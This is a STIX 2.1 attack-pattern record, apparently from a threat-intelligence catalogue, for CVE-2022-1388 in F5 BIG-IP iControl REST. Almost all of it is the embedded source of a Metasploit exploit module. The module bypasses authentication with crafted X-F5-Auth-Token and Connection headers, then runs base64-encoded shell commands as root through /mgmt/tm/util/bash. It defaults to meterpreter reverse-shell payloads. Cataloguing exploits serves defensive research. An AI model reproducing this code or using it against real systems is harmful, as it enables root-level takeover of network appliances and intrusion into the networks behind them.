{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d09d1b6b-abd0-4e05-94a4-d635212e2c62",
    "created": "2024-08-14T17:01:43.894515Z",
    "modified": "2024-08-14T17:01:43.894519Z",
    "name": "F5 BIG-IP iControl RCE via REST Authentication Bypass",
    "description": " This module exploits an authentication bypass vulnerability in the F5 BIG-IP iControl REST service to gain access to the admin account, which is capable of executing commands through the /mgmt/tm/util/bash endpoint.  Successful exploitation results in remote code execution as the root user. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/f5_icontrol_rce.rb",
            "external_id": "f5_icontrol_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-1388"
        },
        {
            "source_name": "reference",
            "url": "https://support.f5.com/csp/article/K23605346"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/alt3kx/CVE-2022-1388_PoC#PoC"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'F5 BIG-IP iControl RCE via REST Authentication Bypass',\n        'Description' => %q{\n          This module exploits an authentication bypass vulnerability\n          in the F5 BIG-IP iControl REST service to gain access to the\n          admin account, which is capable of executing commands\n          through the /mgmt/tm/util/bash endpoint.\n\n          Successful exploitation results in remote code execution\n          as the root user.\n        },\n        'Author' => [\n          'Heyder Andrade', # Metasploit module\n          'alt3kx <alt3kx[at]protonmail.com>', # PoC\n          'James Horseman', # Technical Writeup\n          'Ron Bowes' # Documentation of exploitation specifics\n        ],\n        'References' => [\n          ['CVE', '2022-1388'],\n          ['URL', 'https://support.f5.com/csp/article/K23605346'],\n          ['URL', 'https://www.horizon3.ai/f5-icontrol-rest-endpoint-authentication-bypass-technical-deep-dive/'], # Writeup\n          ['URL', 'https://github.com/alt3kx/CVE-2022-1388_PoC'] # PoC\n        ],\n        'License' => MSF_LICENSE,\n        'DisclosureDate' => '2022-05-04', # Vendor advisory\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/python/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper,\n              'DefaultOptions' => {\n                'CMDSTAGER::FLAVOR' => :bourne,\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 1, # Linux Dropper avoids some timeout issues that Unix Command payloads sometimes encounter.\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true,\n          'PrependFork' => true, # Needed to avoid warnings about timeouts and potential failures across attempts.\n          'MeterpreterTryToFork' => true # Needed to avoid warnings about timeouts and potential failures across attempts.\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION], # Only one concurrent session\n          'SideEffects' => [\n            IOC_IN_LOGS, # /var/log/restjavad.0.log (rotated)\n            ARTIFACTS_ON_DISK # CmdStager\n          ]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path to the iControl installation', '/']),\n        OptString.new('HttpUsername', [true, 'iControl username', 'admin']),\n        OptString.new('HttpPassword', [true, 'iControl password', ''])\n      ]\n    )\n    register_advanced_options([\n      OptFloat.new('CmdExecTimeout', [true, 'Command execution timeout', 3.5])\n    ])\n  end\n\n  def check\n    print_status(\"Checking #{datastore['RHOST']}:#{datastore['RPORT']}\")\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, '/mgmt/shared/authn/login'),\n      'method' => 'GET'\n    })\n\n    return CheckCode::Unknown unless res&.code == 401\n\n    body = res.get_json_document\n\n    return CheckCode::Safe unless body.key?('message') && body['kind'] == ':resterrorresponse'\n\n    signature = Rex::Text.rand_text_alpha(13)\n    stub = \"echo #{signature}\"\n    res = send_command(stub)\n    return CheckCode::Safe unless res&.code == 200\n\n    body = res.get_json_document\n\n    return CheckCode::Safe unless body['kind'] == 'tm:util:bash:runstate'\n\n    return CheckCode::Vulnerable if body['commandResult'].chomp == signature\n\n    CheckCode::Safe\n  end\n\n  def exploit\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    vprint_status(\"Executing command: #{cmd}\")\n\n    res = send_command(cmd)\n    unless res\n      print_warning('Command execution timed out')\n      return\n    end\n\n    json = res.get_json_document\n\n    unless res.code == 200 && json['kind'] == 'tm:util:bash:runstate'\n      fail_with(Failure::PayloadFailed, 'Failed to execute command')\n    end\n\n    print_good('Successfully executed command')\n\n    return unless (cmd_result = json['commandResult'])\n\n    vprint_line(cmd_result)\n  end\n\n  def send_command(cmd)\n    bash_cmd = \"eval $(echo #{Rex::Text.encode_base64(cmd)} | base64 -d)\"\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/mgmt/tm/util/bash'),\n      'ctype' => 'application/json',\n      'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),\n      'headers' => {\n        'Host' => 'localhost',\n        'Connection' => 'keep-alive, X-F5-Auth-Token',\n        'X-F5-Auth-Token' => Rex::Text.rand_text_alpha_lower(6)\n      },\n      'data' => {\n        'command' => 'run',\n        'utilCmdArgs' => \"-c '#{bash_cmd}'\"\n      }.to_json\n    }, datastore['CmdExecTimeout'])\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-05-04, # Vendor advisory",
    "x_mitre_platforms": [
        "linux'"
    ]
}